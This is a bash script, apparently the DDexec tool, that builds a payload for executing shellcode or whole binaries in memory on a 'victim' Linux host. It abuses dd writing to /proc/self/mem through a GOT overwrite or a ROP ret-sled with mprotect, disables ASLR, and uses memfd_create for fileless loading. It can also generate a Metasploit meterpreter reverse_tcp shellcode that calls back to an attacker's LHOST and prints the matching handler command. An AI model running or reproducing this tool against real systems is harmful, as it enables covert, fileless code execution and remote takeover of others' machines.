#!/bin/bash


#############################
##### INITIAL VARIABLES #####
#############################
WRITE_TO_ADDR=$((0x7fffffffe000))
BASE_ADDR=0000555555554000 # Base to load the binary

DD_PATH=""
LIBC_PATH=""
LIBC_BASE=""
LPORT=""
LHOST=""
PAYLOAD="linux/x64/meterpreter/reverse_tcp"
MODE="fclose_got"
OUTPUT_FILE=""
# Shellcode to inject, "echo Pwnd!", for testing
SHELLCODE="4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f054831c048ffc04889c7488d35110000004831d2b2060f054831c0b03c4831ff0f0550776e64210a"
BIN_PATH=""
HEX_DUMP_BIN=""


# All shellcodes should start with this shellcode to recover stdin and stdout
SHELLCODE_INI="4831C04831FF66BF0A0048C7C0200000000F05"
# Recreate FD 0 (stdin) from FD 10
#0:  48 31 c0                xor    rax,rax
#3:  48 31 ff                xor    rdi,rdi
#6:  66 bf 0a 00             mov    di,0xa
#a:  48 c7 c0 20 00 00 00    mov    rax,0x20
#11: 0f 05                   syscall

SHELLCODE_INI="${SHELLCODE_INI}4831C048FFC748C7C0200000000F05"
# Recreate FD 1 (stdout) from FD 11
#0:  48 31 c0                xor    rax,rax
#3:  48 ff c7                inc    rdi
#6:  48 c7 c0 20 00 00 00    mov    rax,0x20
#d:  0f 05                   syscall



read -r -d '' HELP <<- EOM
    Use this program to execute shellcodes and binaries in memory.
    Arguments:
      -h Print this help.
      -o Path to the output file with the final payload to execute in the victim.
      -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
      -l Path to the victim libc (you should download it from the victim).Required with mode "retsled". Find it with 'ldd \`command -v dd\` | grep libc | cut -d" " -f3'.
      -b Libc base address in the victim system. Required for mode "retsled". Execute in the victim: printf "0x";(linux64 -R cat /proc/self/maps || setarch \`arch\` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1
      -H LHOST to receive the meterpreter.
      -P LPORT to receive the meterpreter.
      -p Metasploit payload (by default linux/x64/meterpreter/reverse_tcp).
      -m Mode of memory load. By default fclose_got if dd binary not protected with full relro, if protected, retsled is forced.
      -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
      -B Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.
    
    e.g.: DDexec.sh -d /path/to/dd [-l /path/to/libc] [-B 0x7ffff7de9000] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>] [-B /path/to/binary]
EOM


while getopts "hd:l:H:P:m:p:s:b:B:o:" opt; do
  case "$opt" in
    h|\?) echo "$HELP"; exit 0;;
    d)  DD_PATH=$OPTARG;;
    l)  LIBC_PATH=$OPTARG;;
    b)  LIBC_BASE=$(($OPTARG));;
    P)  LPORT=$OPTARG;;
    H)  LHOST=$OPTARG;;
    m)  MODE=$OPTARG;;
    p)  PAYLOAD=$OPTARG;;
    s)  SHELLCODE=$OPTARG;;
    B)  BIN_PATH=$OPTARG;;
    o)  OUTPUT_FILE=$OPTARG;;
  esac
done

if ! [ "$DD_PATH" ] || ! [ -f "$DD_PATH" ]; then
    echo "Set the path to the dd binary downloaded from the victim system"
    echo "$HELP"
    exit 1
fi
if [ "$LHOST" ] && ! [ "$LPORT" ]; then
    echo "Set the LPORT"
    echo "$HELP"
    exit 1
fi
if [ "$LPORT" ] && ! [ "$LHOST" ]; then
    echo "Set the LHOST"
    echo "$HELP"
    exit 1
fi
if [ "$MODE" != "fclose_got" ] && [ "$MODE" != "retsled" ]; then
    echo "Set the MODE of the memory load, valid values are: 'fclose_got' and 'retsled'"
    echo "$HELP"
    exit 1
fi

if [ "$(readelf -d $DD_PATH | grep 'BIND_NOW')" ] && [ "$MODE" = "fclose_got" ]; then
    echo "DD binary has full relro, MODE must be retsled. Setting it."
    MODE="retsled"
fi

if ! ([ "$LIBC_PATH" ] && [ "$LIBC_BASE" ] && [ -f "$LIBC_PATH" ]) && [ "$MODE" = "retsled" ]; then
    echo "Set the path to the libc library downloaded from the victim system and the base address of libc (this is needed with 'retsled' mode)"
    echo "$HELP"
    exit 1
fi

if [ "$BIN_PATH" ] && ! [ -f "$BIN_PATH" ]; then
    echo "The binary $BIN_PATH wasn't found"
    exit 1
fi

if ! [ "$(command -v objdump)" ]; then
    echo "Install objdump"
    exit 1
fi

if ! [ "$(command -v readelf)" ]; then
    echo "Install readelf"
    exit 1
fi

if ! [ "$(command -v ROPgadget)" ]; then
    echo "Install ROPgadget and put it in PATH"
    exit 1
fi


if [ "$LHOST" ] && [ "$LPORT" ] && [ "$PAYLOAD" ]; then
    echo "Execute: msfconsole -q -x 'use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run'"
    SHELLCODE=$(msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f hex 2>/dev/null)
fi


#############################
######## FUNCTIONS ##########
#############################

to_little_endian()
{
    # Convert given hex value to little endian
    local result=""
    result=$(echo $1 | cut -c 15-16)
    result=${result}$(echo $1 | cut -c 13-14)
    result=${result}$(echo $1 | cut -c 11-12)
    result=${result}$(echo $1 | cut -c 9-10)
    result=${result}$(echo $1 | cut -c 7-8)
    result=${result}$(echo $1 | cut -c 5-6)
    result=${result}$(echo $1 | cut -c 3-4)
    result=${result}$(echo $1 | cut -c 1-2)
    echo -n "$result"
}


get_mprotect_addr (){
    # Find the addr of mprotect inside libc
    mprotect_offset=$(objdump -T $LIBC_PATH | grep -w mprotect | cut -d' ' -f1)
    mprotect_offset=$((0x$mprotect_offset))
    MPROTECT_ADDR=$(($mprotect_offset+$LIBC_BASE))
    MPROTECT_ADDR=$(printf "%016x" $MPROTECT_ADDR)
    echo "&mprotect()     = 0x"$MPROTECT_ADDR
}

get_read_addr (){
    # Find the addr of read inside libc
    read_offset=$(objdump -T $LIBC_PATH | grep -w read | cut -d' ' -f1)
    read_offset=$((0x$read_offset))
    READ_ADDR=$(($read_offset+$LIBC_BASE))
    READ_ADDR=$(printf "%016x" $READ_ADDR)
    echo "&read()         = 0x"$READ_ADDR
}

get_mmap_addr (){
    # Find the addr of read inside libc
    mmap_offset=$(objdump -T $LIBC_PATH | grep -w read | cut -d' ' -f1)
    mmap_offset=$((0x$mmap_offset))
    MMAP_ADDR=$(($read_offset+$LIBC_BASE))
    MMAP_ADDR=$(printf "%016x" $MMAP_ADDR)
    echo "&mmap()         = 0x"$MMAP_ADDR
}

get_pop_rdi (){
    POP_RDI=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
                grep ": pop rdi ; ret" | cut -d' ' -f1)
    POP_RDI=$(echo $POP_RDI | cut -c 3-18)
    echo "POP RDI; RET; in $POP_RDI"
}

get_pop_rsi (){
    POP_RSI=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
            grep ": pop rsi ; ret" | cut -d' ' -f1)
    POP_RSI=$(echo $POP_RSI | cut -c 3-18)
    echo "POP RDI; RET; in $POP_RSI"
}

get_pop_rdx (){
    POP_RDX=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
            grep ": pop rdx ; ret" | cut -d' ' -f1)
    POP_RDX=$(echo $POP_RDX | cut -c 3-18)
    echo "POP RDI; RET; in $POP_RDX"
}

get_ret (){
    RET=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 --only ret | \
        grep ret | grep -v ";" | cut -d' ' -f1)
    RET=$(echo $RET | cut -c 3-18)
    echo "RET; in $RET"
}


###########################
####### BINARY LOAD #######
###########################

if [ "$BIN_PATH" ]; then    
    SHELLCODE_MID="68444541444889e7be00000000b83f0100000f05"
    ## memfd_create (create in-memory only file)
    #1e: 68 44 45 41 44          push   0x44454144
    #23: 48 89 e7                mov    rdi,rsp
    #26: be 00 00 00 00          mov    esi,0x0
    #2b: b8 3f 01 00 00          mov    eax,0x13f
    #30: 0f 05                   syscall
    
    BIN_SIZE=$(stat --printf="%s" "$BIN_PATH")
    BIN_SIZE_1=$(( $BIN_SIZE + 1 ))
    BIN_SIZE_HEX="$(printf "%08x" "$BIN_SIZE")"
    BIN_SIZE_HEX_1="$(printf "%08x" "$BIN_SIZE_1")"
    LE_BIN_SIZE_HEX="$(to_little_endian $BIN_SIZE_HEX)"
    LE_BIN_SIZE_HEX_1="$(to_little_endian $BIN_SIZE_HEX_1)"
    
    SHELLCODE_MID="${SHELLCODE_MID}4889C748C7C6${LE_BIN_SIZE_HEX_1}48C7C04D0000000F05"
    ## ftruncate(fd, $LE_BIN_SIZE_HEX_1)
    #0:  48 89 c7                mov    rdi,rax
    #3:  48 c7 c6 56 56 56 56    mov    rsi,$LE_BIN_SIZE_HEX_1
    #a:  48 c7 c0 4d 00 00 00    mov    rax,0x4d
    #f:  0f 05                   syscall

    SHELLCODE_MID="${SHELLCODE_MID}4989F84831FF48C7C6${LE_BIN_SIZE_HEX_1}48C7C20300000049c7c2010000004D31C948C7C0090000000F05"
    ##src = mmap (0, $LE_BIN_SIZE_HEX_1, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)
    #0:  49 89 f8                mov    r8,rdi
    #3:  48 31 ff                xor    rdi,rdi
    #6:  48 c7 c6 56 56 56 56    mov    rsi,$LE_BIN_SIZE_HEX_1
    #d:  48 c7 c2 03 00 00 00    mov    rdx,0x3
    #14: 48 c7 c1 01 00 00 00    mov    r10,0x1
    #1b: 4d 31 c9                xor    r9,r9
    #1e: 48 c7 c0 09 00 00 00    mov    rax,0x9
    #25: 0f 05                   syscall


    SHELLCODE_MID="${SHELLCODE_MID}4831FF4889C648C7C2${LE_BIN_SIZE_HEX}4889F80F054829C24801C64885D275F0"
    ## Loop to make sure we read all the binary from stdin
    #0:  48 31 ff                xor    rdi,rdi
    #3:  48 89 c6                mov    rsi,rax
    #6:  48 c7 c2 56 56 56 56    mov    rdx,$LE_MAX_READ_SIZE_HEX
    #000000000000000d <loop>:
    #d:  48 89 f8                mov    rax,rdi
    #10: 0f 05                   syscall
    #12: 48 29 c2                sub    rdx,rax
    #15: 48 01 c6                add    rsi,rax
    #18: 48 85 d2                test   rdx,rdx
    #1b: 75 f0                   jne    d <loop>


    SHELLCODE_FIN="b8220000000f05"
    ## pause (suspend the process so it doesn't end)
    #32: b8 22 00 00 00          mov    eax,0x22
    #37: 0f 05                   syscall

    SHELLCODE_FIN="${SHELLCODE_FIN}4831c04883c03c4831ff0f05"
    ## exit (this shound't be reached)
    #39: 48 31 c0                xor    rax,rax
    #3c: 48 83 c0 3c             add    rax,0x3c
    #40: 48 31 ff                xor    rdi,rdi
    #43: 0f 05                   syscall

    SHELLCODE="${SHELLCODE_MID}${SHELLCODE_FIN}"

    # Get hex of the binary, the big column number is to get everything in 1 single line
    HEX_DUMP_BIN=$(xxd -c 99999999999 -p "$BIN_PATH" | sed 's/.\{2\}/\\x&/g')
fi


SHELLCODE="${SHELLCODE_INI}${SHELLCODE}"
SHELLCODE_LENGTH=$(echo -n $SHELLCODE | wc -c)
SHELLCODE_LENGTH=$(( $SHELLCODE_LENGTH / 2 ))
SHELLCODE_LENGTH_16=$(printf "%016x" $SHELLCODE_LENGTH)
SHELLCODE=$(echo -n $SHELLCODE | sed 's/.\{2\}/\\x&/g')
echo "Shellcode length: $SHELLCODE_LENGTH"

EXECUTION_INIT="if [ \"command -v linux64\" ]; then ASLRDISABLER=linux64; elif [ \"command -v setarch\" ]; then ASLRDISABLER='setarch `arch`'; else echo 'No ASLR disabler available'; fi"


#############################
######## fclose_got #########
#############################
if [ "$MODE" = "fclose_got" ]; then
    JMP_ADDR=$(objdump -Mintel -d "$DD_PATH" | grep fclose | grep jmp | awk '{print $1}' | cut -d ':' -f1)
    echo " $EXECUTION_INIT; echo -n -e \"${SHELLCODE}${HEX_DUMP_BIN}\" | (\$ASLRDISABLER -R dd of=/proc/self/mem bs=$SHELLCODE_LENGTH seek=$(( 0x$BASE_ADDR + 0x$JMP_ADDR )) conv=notrunc oflag=seek_bytes count=1 10<&0 11<&1 &)" > "$OUTPUT_FILE"
fi


#############################
######### RETSLED ###########
#############################
if [ "$MODE" = "retsled" ]; then
    get_mprotect_addr
    get_read_addr
    get_pop_rdi
    get_pop_rsi
    get_pop_rdx
    get_ret


    #############################
    ####### GENERATE ROP ########
    #############################

    # retsled to capture the execution
    RETSLED=""
    RETSLED_1=$(to_little_endian $RET)
    for i in {0..400}
    do
        RETSLED="${RETSLED}${RETSLED_1}"
    done

    # Give W permissions to known address
    ROP=${RETSLED}$(to_little_endian $POP_RDI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian "0000000000000002") 
    ROP=${ROP}$(to_little_endian $MPROTECT_ADDR)

    # Read from STDIN the initial shellcode
    ROP=${ROP}$(to_little_endian $POP_RDI)
    ROP=${ROP}"0000000000000000"
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $READ_ADDR)

    # Give Exec permissions and remove the write permissions from the shellcode
    ROP=${ROP}$(to_little_endian $POP_RDI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian "0000000000000004")
    ROP=${ROP}$(to_little_endian $MPROTECT_ADDR)

    # Execute the shellcode
    ROP=${ROP}$(to_little_endian $BASE_ADDR)

    ROP_LEN=$(echo -n $ROP | wc -c)
    ROP_LEN=$(($ROP_LEN / 2))

    ROP=$(echo -n ${ROP} | sed 's/.\{2\}/\\x&/g')
    
    echo " $EXECUTION_INIT; echo -n -e \"${ROP}${SHELLCODE}${HEX_DUMP_BIN}\" | \$ASLRDISABLER -R env -i dd bs=$ROP_LEN of=/proc/self/mem seek=$WRITE_TO_ADDR conv=notrunc oflag=seek_bytes count=1 10<&0 11<&1 &" > "$OUTPUT_FILE"
fi

echo ""
echo "Payload written in '$OUTPUT_FILE'"


